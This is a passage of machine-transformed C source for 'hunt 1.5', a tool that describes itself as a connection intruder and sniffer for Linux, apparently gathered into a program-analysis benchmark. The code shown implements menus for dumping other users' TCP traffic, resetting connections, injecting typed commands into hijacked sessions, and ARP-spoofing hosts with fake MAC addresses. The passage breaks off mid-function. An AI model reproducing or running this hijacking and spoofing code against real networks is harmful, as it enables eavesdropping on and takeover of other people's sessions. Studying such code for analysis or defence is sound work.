#line 35
  return (0);
}
}
#line 39 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/tty.c"
int tty_raw(int fd , int wait_for_chars , int timer_dsec ) 
{ 
  struct termios buf ;
  int tmp ;
  int tmp___0 ;

  {
  {
#line 43
  tmp = tcgetattr(fd, & save_termios);
  }
#line 43
  if (tmp < 0) {
#line 44
    return (-1);
  }
  {
#line 46
  buf = save_termios;
#line 48
  buf.c_lflag &= 4294934516U;
#line 51
  buf.c_iflag &= 4294965965U;
#line 55
  buf.c_cflag &= 4294966991U;
#line 57
  buf.c_cflag |= 48U;
#line 60
  buf.c_oflag &= 4294967294U;
#line 63
  buf.c_cc[6] = (cc_t )wait_for_chars;
#line 64
  buf.c_cc[5] = (cc_t )timer_dsec;
#line 65
  tmp___0 = tcsetattr(fd, 2, (struct termios  const  *)(& buf));
  }
#line 65
  if (tmp___0 < 0) {
#line 66
    return (-1);
  }
#line 67
  ttystate = (enum __anonenum_ttystate_99 )1;
#line 68
  ttysavefd = fd;
#line 69
  return (0);
}
}
#line 73 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/tty.c"
int tty_reset(int fd ) 
{ 
  int tmp ;

  {
#line 75
  if ((unsigned int )ttystate != 2U) {
#line 75
    if ((unsigned int )ttystate != 1U) {
#line 76
      return (0);
    }
  }
  {
#line 78
  tmp = tcsetattr(fd, 2, (struct termios  const  *)(& save_termios));
  }
#line 78
  if (tmp < 0) {
#line 79
    return (-1);
  }
#line 80
  ttystate = (enum __anonenum_ttystate_99 )0;
#line 81
  return (0);
}
}
#line 85 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/tty.c"
void tty_atexit(void) 
{ 


  {
#line 87
  if (ttysavefd >= 0) {
#line 87
    if ((unsigned int )ttystate != 0U) {
      {
#line 88
      tty_reset(ttysavefd);
      }
    }
  }
#line 89
  return;
}
}
#line 92 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/tty.c"
void tty_tput_reset(void) 
{ 


  {
  {
#line 94
  printf((char const   */* __restrict  */)"\033c\033]R");
#line 95
  fflush(stdout);
  }
#line 96
  return;
}
}
#line 113 "/usr/include/x86_64-linux-gnu/sys/socket.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__leaf__)) socket)(int __domain ,
                                                                             int __type ,
                                                                             int __protocol ) ;
#line 215 "/usr/include/signal.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1), __leaf__)) sigemptyset)(sigset_t *__set ) ;
#line 221
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1), __leaf__)) sigaddset)(sigset_t *__set ,
                                                                                                int __signo ) ;
#line 259
extern  __attribute__((__nothrow__)) int ( __attribute__((__leaf__)) sigaction)(int __sig ,
                                                                                struct sigaction  const  * __restrict  __act ,
                                                                                struct sigaction * __restrict  __oact ) ;
#line 286 "/usr/include/pthread.h"
extern  __attribute__((__nothrow__)) pthread_t ( __attribute__((__leaf__)) pthread_self)(void)  __attribute__((__const__)) ;
#line 773
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1))) pthread_mutex_lock)(pthread_mutex_t *__mutex ) ;
#line 784
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1))) pthread_mutex_unlock)(pthread_mutex_t *__mutex ) ;
#line 1000
extern int ( __attribute__((__nonnull__(1,2))) pthread_cond_wait)(pthread_cond_t * __restrict  __cond ,
                                                                  pthread_mutex_t * __restrict  __mutex ) ;
#line 59 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
char *eth_device ;
#line 60
int verbose ;
#line 63
pthread_t main_thread_id ;
#line 64 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
sigset_t intr_mask  ;
#line 316
pthread_t th_hunt ;
#line 321
int hunt_ready ;
#line 322
pthread_mutex_t mutex_hunt_ready ;
#line 323
pthread_cond_t cond_hunt_ready ;
#line 340
void *hunt(void *arg ) ;
#line 342
int conn_list_mac ;
#line 343
int conn_list_seq ;
#line 344
int conn_list(struct user_conn_info **ruci , char **rbuf , int with_mac , int with_seq ) ;
#line 362
void press_key(char *label ) ;
#line 365
int menu_choose_mac(char *label , unsigned char *mac_ret , char *dfl ) ;
#line 374
void clear_new_conn_ind(void) ;
#line 414
void print_data_packet(struct packet *p , int data_len , int count___0 , int dst_packet ) ;
#line 422
int sprintf_eth_mac(char *b , unsigned char *mac ) ;
#line 423
int tap(char *device , int promisc_mode ) ;
#line 431
unsigned char *suggest_mac(void) ;
#line 432
void ctrl_c_prompt(void) ;
#line 433
void clear_scr(void) ;
#line 456
void resolv_init(void) ;
#line 457
void resolv_done(void) ;
#line 474
void user_rst(struct user_conn_info *uci , int count___0 , int mode ) ;
#line 490
int user_stormack_hijack(struct user_conn_info *uci , char *cmdbuf ) ;
#line 503
int user_arp_hijack(struct user_conn_info *uci , char *src_fake_mac , char *dst_fake_mac ,
                    int input_mode ) ;
#line 505
void user_arp_hijack_done(char *src_fake_mac , char *dst_fake_mac ) ;
#line 512
int user_hijack_sync(struct user_conn_info *uci ) ;
#line 524
struct arp_spoof_info *get_arp_spoof(unsigned int src_addr , unsigned int dst_addr ) ;
#line 526
void arpspoof_menu(void) ;
#line 533
int arpspoof_exit_check(void) ;
#line 569
void sniff_menu(void) ;
#line 577
void mac_disc_menu(void) ;
#line 608
void options_menu(void) ;
#line 614
void host_up(void) ;
#line 647
void timer_init(void) ;
#line 648
void timer_done(void) ;
#line 353 "/usr/include/unistd.h"
extern int close(int __fd ) ;
#line 675
extern  __attribute__((__nothrow__)) __uid_t ( __attribute__((__leaf__)) getuid)(void) ;
#line 678
extern  __attribute__((__nothrow__)) __uid_t ( __attribute__((__leaf__)) geteuid)(void) ;
#line 57 "/usr/include/getopt.h"
extern char *optarg ;
#line 150
extern  __attribute__((__nothrow__)) int ( __attribute__((__leaf__)) getopt)(int ___argc ,
                                                                             char * const  *___argv ,
                                                                             char const   *__shortopts ) ;
#line 519 "/usr/include/stdlib.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1), __leaf__)) atexit)(void (*__func)(void) ) ;
#line 543
extern  __attribute__((__nothrow__, __noreturn__)) void ( __attribute__((__leaf__)) exit)(int __status ) ;
#line 168 "/usr/include/stdio.h"
extern struct _IO_FILE *stdin ;
#line 170
extern struct _IO_FILE *stderr ;
#line 356
extern int fprintf(FILE * __restrict  __stream , char const   * __restrict  __format 
                   , ...) ;
#line 622
extern char *fgets(char * __restrict  __s , int __n , FILE * __restrict  __stream ) ;
#line 69 "/usr/include/string.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1,2), __leaf__)) memcmp)(void const   *__s1 ,
                                                                                               void const   *__s2 ,
                                                                                               size_t __n )  __attribute__((__pure__)) ;
#line 132
extern  __attribute__((__nothrow__)) char *( __attribute__((__nonnull__(1,2), __leaf__)) strncpy)(char * __restrict  __dest ,
                                                                                                  char const   * __restrict  __src ,
                                                                                                  size_t __n ) ;
#line 263
extern  __attribute__((__nothrow__)) char *( __attribute__((__nonnull__(1), __leaf__)) strrchr)(char const   *__s ,
                                                                                                int __c )  __attribute__((__pure__)) ;
#line 348
extern  __attribute__((__nothrow__)) char *( __attribute__((__nonnull__(2), __leaf__)) strtok)(char * __restrict  __s ,
                                                                                               char const   * __restrict  __delim ) ;
#line 41 "/usr/include/x86_64-linux-gnu/sys/ioctl.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__leaf__)) ioctl)(int __fd ,
                                                                            unsigned long __request 
                                                                            , ...) ;
#line 23 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
void logo(void) 
{ 


  {
  {
#line 25
  printf((char const   */* __restrict  */)"/*\n *\thunt 1.5\n *\tmultipurpose connection intruder / sniffer for Linux\n *\t(c) 1998-2000 by kra\n */\n");
  }
#line 30
  return;
}
}
#line 32 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
void list_connections(void) 
{ 
  char *buf ;
  char *__buf ;
  char *b ;
  int i ;

  {
  {
#line 36
  i = 0;
#line 38
  clear_new_conn_ind();
#line 40
  conn_list((struct user_conn_info **)((void *)0), & buf, conn_list_mac, conn_list_seq);
  }
#line 41
  if (buf) {
#line 42
    __buf = buf;
    {
#line 43
    while (1) {
      while_continue: /* CIL Label */ ;
      {
#line 43
      b = strtok((char */* __restrict  */)__buf, (char const   */* __restrict  */)"\n");
      }
#line 43
      if (! b) {
#line 43
        goto while_break;
      }
      {
#line 44
      __buf = (char *)((void *)0);
#line 45
      printf((char const   */* __restrict  */)"%s\n", b);
#line 46
      i ++;
      }
#line 46
      if (i % lines_o == 0) {
        {
#line 47
        lines_o_press_key();
        }
      }
    }
    while_break: /* CIL Label */ ;
    }
    {
#line 49
    free((void *)buf);
    }
  } else {
    {
#line 51
    printf((char const   */* __restrict  */)"no connections are available\n");
    }
  }
#line 52
  return;
}
}
#line 54 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
int choose_connection(struct user_conn_info *uci ) 
{ 
  struct user_conn_info *arr_uci ;
  char *str ;
  int count___0 ;
  int i ;
  int retval ;

  {
  {
#line 59
  retval = -1;
#line 61
  count___0 = conn_list(& arr_uci, & str, 0, 0);
  }
#line 62
  if (arr_uci) {
    {
#line 63
    printf((char const   */* __restrict  */)"%s\n", str);
#line 64
    free((void *)str);
#line 65
    i = menu_choose_unr((char *)"choose conn", 0, count___0 - 1, -1);
    }
#line 65
    if (i >= 0) {
      {
#line 66
      memcpy((void */* __restrict  */)uci, (void const   */* __restrict  */)(arr_uci + i),
             sizeof(struct user_conn_info ));
#line 67
      retval = 0;
      }
    }
    {
#line 69
    free((void *)arr_uci);
    }
  } else {
    {
#line 71
    printf((char const   */* __restrict  */)"no connections are available\n");
    }
  }
#line 72
  return (retval);
}
}
#line 76 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
struct list l_dump_connection  = 
#line 76
     {(void *)0, (void *)0, (int )((char *)(& ((struct packet *)0)->p_next[0]) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 78 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
void func_dump_connection_dst(struct packet *p , struct user_conn_info *arg ) 
{ 


  {
#line 80
  if ((unsigned long )(p->p_iph)->saddr == arg->dst_addr) {
#line 80
    if ((unsigned long )(p->p_iph)->daddr == arg->src_addr) {
#line 80
      if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source == (int )arg->dst_port) {
#line 80
        if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest == (int )arg->src_port) {
          {
#line 84
          packet_want(p);
#line 85
          list_produce(& l_dump_connection, (void *)p);
          }
        }
      }
    }
  }
#line 87
  return;
}
}
#line 89 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
void func_dump_connection_src(struct packet *p , struct user_conn_info *arg ) 
{ 


  {
#line 91
  if ((unsigned long )(p->p_iph)->saddr == arg->src_addr) {
#line 91
    if ((unsigned long )(p->p_iph)->daddr == arg->dst_addr) {
#line 91
      if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source == (int )arg->src_port) {
#line 91
        if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest == (int )arg->dst_port) {
          {
#line 95
          packet_want(p);
#line 96
          list_produce(& l_dump_connection, (void *)p);
          }
        }
      }
    }
  }
#line 98
  return;
}
}
#line 100 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
int volatile   loop_running  ;
#line 101 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
static void ctrl_c_handler(int i ) 
{ 


  {
#line 103
  loop_running = (int volatile   )0;
#line 104
  return;
}
}
#line 111 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
void dump_connection_uci(struct user_conn_info *uci , int mode , int same_chars ) 
{ 
  struct packet *p ;
  struct ifunc_item ifunc_src ;
  struct ifunc_item ifunc_dst ;
  struct sigaction sac ;
  struct sigaction old_sac ;
  int dst_packet ;
  char pbuf[256] ;
  int pbuf_len ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 120
  clear_scr();
#line 121
  ctrl_c_prompt();
#line 122
  list_produce_start(& l_dump_connection);
  }
#line 123
  if (mode == 0) {
    {
#line 124
    ifunc_dst.func = (void (*)(struct packet * , void * ))(& func_dump_connection_dst);
#line 126
    ifunc_dst.arg = (void *)uci;
#line 127
    list_enqueue(& l_ifunc_tcp, (void *)(& ifunc_dst));
    }
  } else
#line 123
  if (mode == 2) {
    {
#line 124
    ifunc_dst.func = (void (*)(struct packet * , void * ))(& func_dump_connection_dst);
#line 126
    ifunc_dst.arg = (void *)uci;
#line 127
    list_enqueue(& l_ifunc_tcp, (void *)(& ifunc_dst));
    }
  }
#line 129
  if (mode == 1) {
    {
#line 130
    ifunc_src.func = (void (*)(struct packet * , void * ))(& func_dump_connection_src);
#line 132
    ifunc_src.arg = (void *)uci;
#line 133
    list_enqueue(& l_ifunc_tcp, (void *)(& ifunc_src));
    }
  } else
#line 129
  if (mode == 2) {
    {
#line 130
    ifunc_src.func = (void (*)(struct packet * , void * ))(& func_dump_connection_src);
#line 132
    ifunc_src.arg = (void *)uci;
#line 133
    list_enqueue(& l_ifunc_tcp, (void *)(& ifunc_src));
    }
  }
  {
#line 135
  sac.__sigaction_handler.sa_handler = & ctrl_c_handler;
#line 136
  sigemptyset(& sac.sa_mask);
#line 137
  sigaddset(& sac.sa_mask, 2);
#line 138
  sac.sa_flags = 268435456;
#line 139
  sigaction(2, (struct sigaction  const  */* __restrict  */)(& sac), (struct sigaction */* __restrict  */)(& old_sac));
#line 140
  loop_running = (int volatile   )1;
  }
  {
#line 141
  while (1) {
    while_continue: /* CIL Label */ ;
#line 141
    if (loop_running) {
      {
#line 141
      tmp___0 = list_consume(& l_dump_connection, (struct timespec  const  *)((void *)0));
#line 141
      p = (struct packet *)tmp___0;
      }
#line 141
      if (! p) {
#line 141
        goto while_break;
      }
    } else {
#line 141
      goto while_break;
    }
#line 142
    if ((unsigned long )(p->p_iph)->saddr == uci->src_addr) {
#line 142
      if ((unsigned long )(p->p_iph)->daddr == uci->dst_addr) {
#line 142
        if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source == (int )uci->src_port) {
#line 142
          if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest == (int )uci->dst_port) {
#line 146
            dst_packet = 0;
          } else {
#line 148
            dst_packet = 1;
          }
        } else {
#line 148
          dst_packet = 1;
        }
      } else {
#line 148
        dst_packet = 1;
      }
    } else {
#line 148
      dst_packet = 1;
    }
#line 152
    if (! dst_packet) {
#line 152
      if (p->p_data_len) {
#line 152
        if (! same_chars) {
#line 153
          if ((unsigned long )p->p_data_len < sizeof(pbuf)) {
#line 153
            pbuf_len = p->p_data_len;
          } else {
#line 153
            pbuf_len = (int )sizeof(pbuf);
          }
          {
#line 154
          memcpy((void */* __restrict  */)(pbuf), (void const   */* __restrict  */)p->p_data,
                 (size_t )pbuf_len);
          }
        } else {
#line 156
          pbuf_len = 0;
        }
      } else {
#line 156
        pbuf_len = 0;
      }
    } else {
#line 156
      pbuf_len = 0;
    }
#line 160
    if (dst_packet) {
#line 160
      if (p->p_data_len) {
#line 160
        if (! same_chars) {
#line 161
          if (p->p_data_len == pbuf_len) {
            {
#line 161
            tmp = memcmp((void const   *)p->p_data, (void const   *)(pbuf), (size_t )pbuf_len);
            }
#line 161
            if (tmp == 0) {
#line 163
              pbuf_len = 0;
            } else {
              {
#line 165
              print_data_packet(p, p->p_data_len, 0, dst_packet);
              }
            }
          } else {
            {
#line 165
            print_data_packet(p, p->p_data_len, 0, dst_packet);
            }
          }
        } else {
          {
#line 167
          print_data_packet(p, p->p_data_len, 0, dst_packet);
          }
        }
      } else {
        {
#line 167
        print_data_packet(p, p->p_data_len, 0, dst_packet);
        }
      }
    } else {
      {
#line 167
      print_data_packet(p, p->p_data_len, 0, dst_packet);
      }
    }
    {
#line 169
    packet_free(p);
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 171
  if (mode == 0) {
    {
#line 172
    list_remove(& l_ifunc_tcp, (void *)(& ifunc_dst));
    }
  } else
#line 171
  if (mode == 2) {
    {
#line 172
    list_remove(& l_ifunc_tcp, (void *)(& ifunc_dst));
    }
  }
#line 173
  if (mode == 1) {
    {
#line 174
    list_remove(& l_ifunc_tcp, (void *)(& ifunc_src));
    }
  } else
#line 173
  if (mode == 2) {
    {
#line 174
    list_remove(& l_ifunc_tcp, (void *)(& ifunc_src));
    }
  }
  {
#line 175
  packet_flush(& l_dump_connection);
#line 176
  tty_tput_reset();
#line 177
  press_key((char *)"\n\n-- press any key> ");
#line 178
  sigaction(2, (struct sigaction  const  */* __restrict  */)(& old_sac), (struct sigaction */* __restrict  */)((void *)0));
  }
#line 179
  return;
}
}
#line 181 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
void dump_connection(struct user_conn_info *uci ) 
{ 
  int c ;

  {
  {
#line 185
  c = menu_choose_sdb((char *)"dump", (char )'b');
  }
  {
#line 187
  if (c == 100) {
#line 187
    goto case_100;
  }
#line 190
  if (c == 115) {
#line 190
    goto case_115;
  }
#line 193
  if (c == 98) {
#line 193
    goto case_98;
  }
#line 186
  goto switch_break;
  case_100: /* CIL Label */ 
  {
#line 188
  dump_connection_uci(uci, 0, 0);
  }
#line 189
  goto switch_break;
  case_115: /* CIL Label */ 
  {
#line 191
  dump_connection_uci(uci, 1, 0);
  }
#line 192
  goto switch_break;
  case_98: /* CIL Label */ 
  {
#line 194
  c = menu_choose_char((char *)"print src/dst same characters y/n", (char *)"ny",
                       (char )'n');
  }
  {
#line 196
  if (c == 110) {
#line 196
    goto case_110;
  }
#line 199
  if (c == 121) {
#line 199
    goto case_121;
  }
#line 195
  goto switch_break___0;
  case_110: /* CIL Label */ 
  {
#line 197
  dump_connection_uci(uci, 2, 0);
  }
#line 198
  goto switch_break___0;
  case_121: /* CIL Label */ 
  {
#line 200
  dump_connection_uci(uci, 2, 1);
  }
#line 201
  goto switch_break___0;
  switch_break___0: /* CIL Label */ ;
  }
#line 203
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
#line 205
  return;
}
}
#line 207 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
void reset_connection(void) 
{ 
  struct user_conn_info uci ;
  int c ;
  int tmp ;

  {
  {
#line 212
  tmp = choose_connection(& uci);
  }
#line 212
  if (! tmp) {
    {
#line 213
    c = menu_choose_sdb((char *)"reset", (char )'b');
    }
    {
#line 215
    if (c == 100) {
#line 215
      goto case_100;
    }
#line 219
    if (c == 115) {
#line 219
      goto case_115;
    }
#line 223
    if (c == 98) {
#line 223
      goto case_98;
    }
#line 214
    goto switch_break;
    case_100: /* CIL Label */ 
    {
#line 216
    user_rst(& uci, 1, 1);
#line 217
    printf((char const   */* __restrict  */)"done\n");
    }
#line 218
    goto switch_break;
    case_115: /* CIL Label */ 
    {
#line 220
    user_rst(& uci, 1, 0);
#line 221
    printf((char const   */* __restrict  */)"done\n");
    }
#line 222
    goto switch_break;
    case_98: /* CIL Label */ 
    {
#line 224
    user_rst(& uci, 1, 2);
#line 225
    printf((char const   */* __restrict  */)"done\n");
    }
#line 226
    goto switch_break;
    switch_break: /* CIL Label */ ;
    }
  }
#line 229
  return;
}
}
#line 231 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
void simple_hijack(void) 
{ 
  char cmdbuf[256] ;
  struct user_conn_info uci ;
  int retval ;
  int c ;
  int tmp ;
  int tmp___0 ;

  {
  {
#line 235
  retval = 0;
#line 238
  tmp___0 = choose_connection(& uci);
  }
#line 238
  if (! tmp___0) {
    {
#line 239
    c = menu_choose_char((char *)"dump connection y/n", (char *)"yn", (char )'n');
    }
    {
#line 241
    if (c == 121) {
#line 241
      goto case_121;
    }
#line 240
    goto switch_break;
    case_121: /* CIL Label */ 
    {
#line 242
    dump_connection(& uci);
    }
#line 243
    goto switch_break;
    switch_break: /* CIL Label */ ;
    }
    {
#line 245
    while (1) {
      while_continue: /* CIL Label */ ;
      {
#line 246
      set_tty_color((enum TTY_COLOR )15);
#line 247
      fprintf((FILE */* __restrict  */)stdout, (char const   */* __restrict  */)"Enter the command string you wish executed or [cr]> ");
#line 248
      set_tty_color((enum TTY_COLOR )7);
#line 249
      fflush(stdout);
#line 250
      fgets((char */* __restrict  */)(cmdbuf), (int )sizeof(cmdbuf), (FILE */* __restrict  */)stdin);
      }
#line 251
      if ((int )cmdbuf[0] == 10) {
#line 252
        goto while_break;
      }
      {
#line 245
      retval = user_stormack_hijack(& uci, cmdbuf);
      }
#line 245
      if (! (retval == 0)) {
#line 245
        goto while_break;
      }
    }
    while_break: /* CIL Label */ ;
    }
#line 254
    if (retval <= 0) {
      {
#line 255
      c = menu_choose_char((char *)"[r]eset connection/[s]ynchronize/[n]one", (char *)"rsn",
                           (char )'r');
      }
      {
#line 257
      if (c == 114) {
#line 257
        goto case_114;
      }
#line 260
      if (c == 115) {
#line 260
        goto case_115;
      }
#line 256
      goto switch_break___0;
      case_114: /* CIL Label */ 
      {
#line 258
      user_rst(& uci, 1, 2);
      }
#line 259
      goto switch_break___0;
      case_115: /* CIL Label */ 
      {
#line 261
      tmp = user_hijack_sync(& uci);
      }
#line 261
      if (tmp) {
        {
#line 262
        printf((char const   */* __restrict  */)"\n");
#line 263
        c = menu_choose_char((char *)"[r]eset connection/[n]one", (char *)"rn", (char )'r');
        }
        {
#line 265
        if (c == 114) {
#line 265
          goto case_114___0;
        }
#line 264
        goto switch_break___1;
        case_114___0: /* CIL Label */ 
        {
#line 266
        user_rst(& uci, 1, 2);
        }
#line 267
        goto switch_break___1;
        switch_break___1: /* CIL Label */ ;
        }
      } else {
        {
#line 270
        printf((char const   */* __restrict  */)"\n");
        }
      }
#line 271
      goto switch_break___0;
      switch_break___0: /* CIL Label */ ;
      }
    }
    {
#line 274
    printf((char const   */* __restrict  */)"done\n");
    }
  }
#line 276
  return;
}
}
#line 278 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
void a_hijack(void) 
{ 
  unsigned char __src_fake_mac[6] ;
  unsigned char __dst_fake_mac[6] ;
  unsigned char *src_fake_mac ;
  unsigned char *dst_fake_mac ;
  char buf[512] ;
  struct user_conn_info uci ;
  int retval ;
  int retval2 ;
  int c ;
  int input_mode ;
  unsigned char *tmp ;
  int tmp___0 ;
  unsigned char *tmp___1 ;
  int tmp___2 ;
  struct arp_spoof_info *tmp___3 ;
  struct arp_spoof_info *tmp___4 ;
  int tmp___5 ;
  int tmp___6 ;

  {
  {
#line 280
  __src_fake_mac[0] = (unsigned char)234;
#line 280
  __src_fake_mac[1] = (unsigned char)26;
#line 280
  __src_fake_mac[2] = (unsigned char)222;
#line 280
  __src_fake_mac[3] = (unsigned char)173;
#line 280
  __src_fake_mac[4] = (unsigned char)190;
#line 280
  __src_fake_mac[5] = (unsigned char)239;
#line 281
  __dst_fake_mac[0] = (unsigned char)234;
#line 281
  __dst_fake_mac[1] = (unsigned char)26;
#line 281
  __dst_fake_mac[2] = (unsigned char)222;
#line 281
  __dst_fake_mac[3] = (unsigned char)173;
#line 281
  __dst_fake_mac[4] = (unsigned char)190;
#line 281
  __dst_fake_mac[5] = (unsigned char)238;
#line 282
  src_fake_mac = (unsigned char *)((void *)0);
#line 283
  dst_fake_mac = (unsigned char *)((void *)0);
#line 289
  tmp___6 = choose_connection(& uci);
  }
#line 289
  if (! tmp___6) {
    {
#line 290
    tmp___3 = get_arp_spoof((unsigned int )uci.src_addr, (unsigned int )uci.dst_addr);
    }
#line 290
    if (tmp___3) {
      {
#line 324
      printf((char const   */* __restrict  */)"hosts already ARP spoofed\n");
      }
    } else {
      {
#line 290
      tmp___4 = get_arp_spoof((unsigned int )uci.dst_addr, (unsigned int )uci.src_addr);
      }
#line 290
      if (tmp___4) {
        {
#line 324
        printf((char const   */* __restrict  */)"hosts already ARP spoofed\n");
        }
      } else {
        {
#line 292
        c = menu_choose_char((char *)"arp spoof src in dst y/n", (char *)"yn", (char )'y');
        }
        {
#line 294
        if (c == 121) {
#line 294
          goto case_121;
        }
#line 300
        if (c == 110) {
#line 300
          goto case_110;
        }
#line 303
        goto switch_default;
        case_121: /* CIL Label */ 
        {
#line 295
        tmp = suggest_mac();
#line 295
        sprintf_eth_mac(buf, tmp);
#line 296
        tmp___0 = menu_choose_mac((char *)"src MAC", __src_fake_mac, buf);
        }
#line 296
        if (tmp___0 < 0) {
#line 297
          return;
        }
#line 298
        src_fake_mac = __src_fake_mac;
#line 299
        goto switch_break;
        case_110: /* CIL Label */ 
#line 301
        src_fake_mac = (unsigned char *)((void *)0);
#line 302
        goto switch_break;
        switch_default: /* CIL Label */ 
#line 304
        return;
        switch_break: /* CIL Label */ ;
        }
        {
#line 306
        c = menu_choose_char((char *)"arp spoof dst in src y/n", (char *)"yn", (char )'y');
        }
        {
#line 308
        if (c == 121) {
#line 308
          goto case_121___0;
        }
#line 314
        if (c == 110) {
#line 314
          goto case_110___0;
        }
#line 317
        goto switch_default___0;
        case_121___0: /* CIL Label */ 
        {
#line 309
        tmp___1 = suggest_mac();
#line 309
        sprintf_eth_mac(buf, tmp___1);
#line 310
        tmp___2 = menu_choose_mac((char *)"dst MAC", __dst_fake_mac, buf);
        }
#line 310
        if (tmp___2 < 0) {
#line 311
          return;
        }
#line 312
        dst_fake_mac = __dst_fake_mac;
#line 313
        goto switch_break___0;
        case_110___0: /* CIL Label */ 
#line 315
        dst_fake_mac = (unsigned char *)((void *)0);
#line 316
        goto switch_break___0;
        switch_default___0: /* CIL Label */ 
#line 318
        return;
        switch_break___0: /* CIL Label */ ;
        }
#line 320
        if (! src_fake_mac) {
#line 320
          if (! dst_fake_mac) {
            {
#line 321
            printf((char const   */* __restrict  */)"Possible ACK storm can ocure because you don\'t do ARP spoof at all, OK\n");
            }
          }
        }
      }
    }
    {
#line 326
    tmp___5 = menu_choose_char((char *)"input mode [r]aw, [l]ine+echo+\\r, line+[e]cho",
                               (char *)"rle", (char )'r');
    }
    {
#line 327
    if (tmp___5 == 114) {
#line 327
      goto case_114;
    }
#line 330
    if (tmp___5 == 108) {
#line 330
      goto case_108;
    }
#line 333
    if (tmp___5 == 101) {
#line 333
      goto case_101;
    }
#line 336
    goto switch_default___1;
    case_114: /* CIL Label */ 
#line 328
    input_mode = 0;
#line 329
    goto switch_break___1;
    case_108: /* CIL Label */ 
#line 331
    input_mode = 1;
#line 332
    goto switch_break___1;
    case_101: /* CIL Label */ 
#line 334
    input_mode = 2;
#line 335
    goto switch_break___1;
    switch_default___1: /* CIL Label */ 
#line 337
    return;
    switch_break___1: /* CIL Label */ ;
    }
    {
#line 339
    c = menu_choose_char((char *)"dump connectin y/n", (char *)"yn", (char )'y');
    }
    {
#line 341
    if (c == 121) {
#line 341
      goto case_121___1;
    }
#line 344
    if (c == 110) {
#line 344
      goto case_110___1;
    }
#line 347
    goto switch_default___2;
    case_121___1: /* CIL Label */ 
    {
#line 342
    dump_connection(& uci);
    }
#line 343
    goto switch_break___2;
    case_110___1: /* CIL Label */ 
    {
#line 345
    press_key((char *)"press key to take over of connection");
    }
#line 346
    goto switch_break___2;
    switch_default___2: /* CIL Label */ 
#line 348
    return;
    switch_break___2: /* CIL Label */ ;
    }
    {
#line 350
    retval = user_arp_hijack(& uci, (char *)src_fake_mac, (char *)dst_fake_mac, input_mode);
    }
#line 352
    if (retval <= 0) {
      {
#line 353
      c = menu_choose_char((char *)"\n[r]eset connection/[s]ynchronize/[n]one", (char *)"rsn",
                           (char )'r');
      }
      {
#line 355
      if (c == 114) {
#line 355
        goto case_114___0;
      }
#line 358
      if (c == 115) {
#line 358
        goto case_115;
      }
#line 354
      goto switch_break___3;
      case_114___0: /* CIL Label */ 
      {
#line 356
      user_rst(& uci, 1, 2);
      }
#line 357
      goto switch_break___3;
      case_115: /* CIL Label */ 
      {
#line 359
      retval2 = user_hijack_sync(& uci);
      }
#line 360
      if (retval2) {
        {
#line 361
        printf((char const   */* __restrict  */)"\n");
#line 362
        c = menu_choose_char((char *)"[r]eset connection/[n]one", (char *)"rn", (char )'r');
        }
        {
#line 364
        if (c == 114) {
#line 364
          goto case_114___1;
        }
#line 363
        goto switch_break___4;
        case_114___1: /* CIL Label */ 
        {
#line 365
        user_rst(& uci, 1, 2);
        }
#line 366
        goto switch_break___4;
        switch_break___4: /* CIL Label */ ;
        }
      } else {
        {
#line 369
        printf((char const   */* __restrict  */)"\n");
        }
      }
#line 370
      goto switch_break___3;
      switch_break___3: /* CIL Label */ ;
      }
    }
    {
#line 373
    user_arp_hijack_done((char *)src_fake_mac, (char *)dst_fake_mac);
#line 374
    printf((char const   */* __restrict  */)"done\n");
    }
  }
#line 376
  return;
}
}
#line 378 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
static void choose_daemon(void) 
{ 
  char *daemon_menu ;
  char *daemon_chars ;
  int run_it ;
  int tmp ;

  {
#line 380
  daemon_menu = (char *)"r) reset daemon\na) arp spoof + arp relayer daemon\ns) sniff daemon\nm) mac discovery daemon\nx) return\n";
#line 385
  daemon_chars = (char *)"rasmx";
#line 386
  run_it = 1;
  {
#line 388
  while (1) {
    while_continue: /* CIL Label */ ;
#line 388
    if (! run_it) {
#line 388
      goto while_break;
    }
    {
#line 389
